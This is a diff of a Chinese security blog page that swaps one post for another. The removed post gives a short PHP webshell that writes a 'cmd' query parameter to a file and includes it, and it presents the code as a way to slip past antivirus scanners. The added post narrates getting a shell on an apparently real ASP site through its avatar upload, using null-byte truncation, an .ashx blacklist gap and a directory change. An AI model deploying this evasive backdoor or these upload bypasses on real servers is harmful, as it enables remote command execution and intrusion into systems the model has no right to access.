@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>
     
-  使用include函数打造过狗一句话 - NIANHUA BLOG
+  记一次上传绕过getshell - NIANHUA BLOG
   
   </title>
   
@@ -117,14 +117,14 @@
       <div class="markdown-body article-wrap">
        <div class="article">
           
-          <h1>使用include函数打造过狗一句话</h1>
+          <h1>记一次上传绕过getshell</h1>
      
         <div class="read-more clearfix">
-          <span class="date">2019/2/21</span>
+          <span class="date">2019/4/19</span>
 
           <span>posted in&nbsp;</span> 
           
-              <span class="posted-in"><a href='php.html'>PHP</a></span>
+              <span class="posted-in"><a href='miscellany.html'>杂记</a></span>
            
          
           <span class="comments">
@@ -137,30 +137,80 @@
       </div><!-- article -->
 
       <div class="article-content">
-      <p>今天在看文件包含的时候，突然想到如果使用文件包含写一个木马怎么样??<br/>
-这样可以避免很多杀软，因为在正常的项目文件中不可避免要出现include。</p>
+      <p>前几天挖漏洞，发现一个有意思的上传点，分享给大家。</p>
+
+<p>因为漏洞已经被修复了，这里我就是以文字叙述为主。</p>
 
 <span id="more"></span><!-- more -->
 
-<p>说是一句话，可是不止一句话哈哈哈</p>
+<p>首先进行信息收集，爬取了网站的目录信息，但是并没有什么收获(ASP网站)。</p>
 
-<pre class="line-numbers"><code class="language-php">&lt;?php 
-        
-        $myfile = fopen(&quot;0238775c7bd96e2eab98038afe0c4279&quot;, &quot;w&quot;);
-        
-        fwrite($myfile, substr($_GET[&#39;cmd&#39;],0,strlen($_GET[&#39;cmd&#39;])));
-        
-        fclose($myfile);
-        
-        include(&quot;0238775c7bd96&quot; . &quot;e2eab98038afe0c4279&quot;);
-?&gt;
-</code></pre>
+<p>试试御剑扫描，发现存在/user目录。</p>
 
-<p>先看一下效果吧，使用D盾查杀：<br/>
-<img src="media/15507646210722/15507651950609.jpg" alt=""/></p>
+<p><img src="media/15556755538657/1555663161550.jpg" alt="1555663161550"/></p>
 
-<p>使用方法：<br/>
-<img src="media/15507646210722/15507652106771.jpg" alt=""/></p>
+<p>提示需要登陆注册，(感觉这是个cms，机智的我找了找这个CMS的漏洞，然而并没有什么发现)</p>
+
+<p><img src="media/15556755538657/1.jpg" alt="1"/></p>
+
+<p>注册之后，发现头像修改处可以上传头像，我就喜欢着这种上传拿SHELL (这个网站没有WAF)</p>
+
+<p><img src="media/15556755538657/15556757929269.jpg" alt=""/></p>
+
+<p>首先尝试了一张正常的JPG图片，发现返回随机名称.jpg</p>
+
+<p><img src="media/15556755538657/2.jpg" alt="2"/></p>
+
+<p>我们可以看到，请求的数据包中有个AutoReName字段很可疑，我们测试一下:</p>
+
+<p><img src="media/15556755538657/3.jpg" alt="3"/></p>
+
+<p>经过测试，发现为0的情况下不修改文件名：</p>
+
+<p><img src="media/15556755538657/4.jpg" alt="4"/></p>
+
+<p>尝试上传ASP文件：<br/>
+(经过测试发现此处为白名单验证)<br/>
+<img src="media/15556755538657/5.jpg" alt="5"/></p>
+
+<p>试试上传HTML文件:</p>
+
+<p><img src="media/15556755538657/6.jpg" alt="6"/></p>
+
+<p>00截断可以吗？</p>
+
+<p><img src="media/15556755538657/7.jpg" alt="7"/></p>
+
+<p>what? 上传成功？</p>
+
+<p><img src="media/15556755538657/8.jpg" alt="8"/></p>
+
+<p>好吧，是真的成功了。</p>
+
+<p>试试asp～～</p>
+
+<p><img src="media/15556755538657/9.jpg" alt="9"/></p>
+
+<p>可以看到这里报的错误和刚刚是不一样的，我们完全有理由相信：<br/>
+他对文件名进行了两次检查，第一次检查使用了白名单检查，此处第二次检查我们fuzz测试一下。</p>
+
+<p><img src="media/15556755538657/10.jpg" alt="10"/></p>
+
+<p>经过测试，发现ashx文件居然可以上传，哈哈哈哈哈，说明第二个是个黑名单检查。</p>
+
+<p>访问刚刚上传的小马(文件内容不是图中的),发现没有办法解析。</p>
+
+<p><img src="media/15556755538657/11.jpg" alt="11"/></p>
+
+<p>尝试修改目录为根目录</p>
+
+<p><img src="media/15556755538657/12.jpg" alt="12"/></p>
+
+<p>哈哈哈哈，您有新的shell请查收</p>
+
+<p><img src="media/15556755538657/13.jpg" alt="13"/></p>
+
+<p>谢谢大佬观看</p>
 
 
     
@@ -171,16 +221,13 @@
         <div class="large-6 columns">
         <p class="text-left" style="padding:15px 0px;">
       
-          <a href="PHP-big-trojan-safedog.html" 
-          title="Previous Post: 任意PHP大马过安全狗的思路">&laquo; 任意PHP大马过安全狗的思路</a>
-      
         </p>
         </div>
         <div class="large-6 columns">
       <p class="text-right" style="padding:15px 0px;">
       
-          <a  href="15502392515780.html" 
-          title="Next Post: 比特币原理">比特币原理 &raquo;</a>
+          <a  href="Burp-Extender-Information.html" 
+          title="Next Post: Burp插件 - 自动标记敏感信息">Burp插件 - 自动标记敏感信息 &raquo;</a>
       
       </p>
         </div>
